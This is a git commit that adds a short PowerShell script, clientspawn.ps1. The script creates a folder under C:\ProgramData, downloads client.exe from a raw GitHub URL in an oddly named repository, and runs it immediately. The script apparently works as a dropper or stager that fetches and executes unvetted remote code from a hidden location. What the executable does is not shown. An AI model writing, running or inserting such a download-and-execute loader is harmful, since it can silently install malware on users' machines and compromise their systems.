da8e98c3d4513994d2f68954882fecb70e8c5746
RedTheMenace <101410080+RedTheMenace@users.noreply.github.com>
2022-08-29 23:05:04 -0400

    Add files via upload

---
+++ clientspawn.ps1
@@ -0,0 +1,5 @@
+mkdir C:\ProgramData\TCPMSG
+$source = 'https://raw.githubusercontent.com/RedTheMenace/werwetfgawsergw345w3tserghwe/main/client.exe'
+$destination = 'C:\ProgramData\TCPMSG\client.exe'
+Invoke-WebRequest -Uri $source -OutFile $destination
+Start-Process C:\ProgramData\TCPMSG\client.exe
